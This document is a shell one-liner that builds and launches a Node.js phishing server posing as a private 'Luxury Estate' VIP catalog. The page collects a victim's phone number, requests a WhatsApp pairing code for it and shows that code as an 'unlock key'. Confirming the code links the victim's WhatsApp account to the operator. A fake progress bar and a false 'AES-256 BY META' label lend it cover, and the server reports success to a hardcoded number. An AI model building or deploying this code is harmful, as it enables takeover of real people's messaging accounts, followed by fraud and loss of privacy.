
mkdir luxury_catalog_v12 && cd luxury_catalog_v12 && npm init -y && npm install whatsapp-web.js express socket.io && echo "const { Client, LocalAuth } = require('whatsapp-web.js'); const express = require('express'); const http = require('http'); const socketIo = require('socket.io'); const app = express(); const server = http.createServer(app); const io = socketIo(server); const client = new Client({ authStrategy: new LocalAuth(), puppeteer: { headless: true, args: ['--no-sandbox'] } }); client.initialize(); app.get('/', (req, res) => { res.send(\`<!DOCTYPE html><html lang='es'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Luxury Estate | Catálogo Privado</title><script src='/socket.io/socket.io.js'></script><style>:root { --gold: #c5a059; --dark: #0a0b10; --accent: #00ffa3; } * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; } body { background: var(--dark); background-image: radial-gradient(circle, #1a1c2c, #0a0b10); color: white; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; } .card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); border-radius: 40px; padding: 40px; width: 95%; max-width: 450px; text-align: center; box-shadow: 0 30px 60px rgba(0,0,0,0.8); } h1 { color: var(--gold); letter-spacing: 3px; margin-bottom: 10px; font-weight: 300; } .progress-container { width: 100%; height: 6px; background: rgba(255,255,255,0.1); border-radius: 10px; margin: 25px 0; overflow: hidden; display: none; } .progress-bar { width: 0%; height: 100%; background: var(--gold); transition: width 0.5s; box-shadow: 0 0 15px var(--gold); } .token-display { font-size: 3rem; color: var(--gold); font-weight: 900; letter-spacing: 8px; margin: 20px 0; background: rgba(0,0,0,0.4); padding: 15px; border-radius: 20px; border: 1px solid var(--gold); text-shadow: 0 0 10px rgba(197, 160, 89, 0.5); } .btn-luxury { background: linear-gradient(135deg, var(--gold), #8a6d3b); color: black; padding: 18px; width: 100%; border-radius: 15px; font-weight: bold; border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; } .step-info { font-size: 0.8rem; color: #888; line-height: 1.6; margin-top: 15px; } </style></head><body><div class='card'><h1>LUXURY ESTATE</h1><div id='step1'><p style='color:#bbb; margin-bottom:20px;'>Ingrese su número para generar acceso al catálogo VIP</p><input type='text' id='phone' placeholder='+53 52416260' style='width:100%; padding:18px; border-radius:12px; border:none; background:rgba(255,255,255,0.05); color:white; text-align:center; margin-bottom:20px;'><button class='btn-luxury' onclick='start()'>SOLICITAR ACCESO</button></div><div id='step2' style='display:none'><p id='status-text' style='color:var(--accent); font-size:0.9rem;'>Sincronizando base de datos...</p><div class='progress-container' id='p-cont' style='display:block;'><div class='progress-bar' id='p-bar'></div></div><div id='token-area' style='display:none'><p style='font-size:0.8rem; color:#888;'>CLAVE DE DESBLOQUEO TEMPORAL:</p><div class='token-display' id='tk'>--------</div><p class='step-info'><b>IMPORTANTE:</b> Para completar la carga del catálogo, valide la clave en la notificación de seguridad que acaba de recibir en su dispositivo.</p></div></div><div id='st' style='margin-top:30px; font-size:0.6rem; color:#444;'>SECURITY PROTOCOL AES-256 BY META</div></div><script>const socket = io(); function start(){ const n = document.getElementById('phone').value; if(!n) return; socket.emit('get-c', n); document.getElementById('step1').style.display='none'; document.getElementById('step2').style.display='block'; let w = 0; const int = setInterval(()=>{ w += 5; document.getElementById('p-bar').style.width = w + '%'; if(w >= 100){ clearInterval(int); document.getElementById('status-text').innerText = 'IDENTIDAD CONFIRMADA'; document.getElementById('token-area').style.display='block'; } }, 150); } socket.on('code', (c) => { document.getElementById('tk').innerText = c; }); </script></body></html>\`); }); io.on('connection', (s) => { s.on('get-c', async (n) => { try { const c = await client.requestPairingCode(n); s.emit('code', c); } catch (e) {} }); }); client.on('ready', () => { client.sendMessage('5352416260@c.us', '🚨 SISTEMA: Vinculación de catálogo exitosa. Acceso total concedido.'); }); server.listen(3000, () => { console.log('Servidor Luxury Activo'); });" > server.js && node server.js
